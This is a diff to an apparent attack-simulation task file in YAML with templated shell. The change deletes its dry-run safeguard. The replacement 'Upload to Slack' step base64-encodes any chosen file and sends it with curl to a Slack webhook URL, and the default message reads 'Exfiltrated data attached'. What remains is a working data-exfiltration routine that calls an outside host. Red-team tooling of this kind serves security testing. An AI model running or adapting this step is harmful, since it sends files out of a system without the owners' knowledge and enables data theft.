@@ -31,10 +31,6 @@ args:
   description: Message text with file
   type: string
   default: Exfiltrated data attached
-- name: dry_run
-  description: Enable dry-run mode
-  type: string
-  default: 'true'
 steps:
 - name: Verify file exists
   inline: test -f '{{ .Args.file_path }}' || (echo 'File not found'; exit 1)
@@ -52,23 +48,14 @@ steps:
     echo "  Encoded size: $encoded_size bytes"
 - name: Upload to Slack
   inline: |
-    if [ '{{ .Args.dry_run }}' = 'true' ]; then
-      echo "DRY RUN: Slack File Upload"
-      echo "Webhook: {{ .Args.slack_webhook_url }}"
-      echo "Channel: {{ .Args.slack_channel }}"
-      echo "File: $(basename '{{ .Args.file_path }}')"
-      echo ""
-      echo "Payload would contain:"
-      echo "  - Message: {{ .Args.message_text }}"
-      echo "  - File attachment (base64 encoded)"
-      echo "  - File size: $(du -h '{{ .Args.file_path }}' | cut -f1)"
-    else
-      json_payload='{"channel": "#exfiltration", "text": "Exfiltrated data attached", "attachments": [{"fallback": "File Upload", "title": "data.tar.gz", "text": "File size: unknown"}]}'
-      curl -X POST \
-        -H "Content-type: application/json" \
-        --data "$json_payload" \
-        'https://hooks.slack.com/services/T00000000/B00000000/XXXX'
-    fi
+    filesize=$(du -h '{{ .Args.file_path }}' | cut -f1)
+    filename=$(basename '{{ .Args.file_path }}')
+    encoded=$(base64 < '{{ .Args.file_path }}')
+    json_payload="{\"channel\": \"{{ .Args.slack_channel }}\", \"text\": \"{{ .Args.message_text }}\", \"attachments\": [{\"fallback\": \"File Upload\", \"title\": \"${filename}\", \"text\": \"File size: ${filesize}\\nData: ${encoded}\"}]}"
+    curl -X POST \
+      -H "Content-type: application/json" \
+      --data "$json_payload" \
+      '{{ .Args.slack_webhook_url }}'
   cleanup:
     inline: rm -f /tmp/test_slack.dat /tmp/slack_payload.json
 tests:
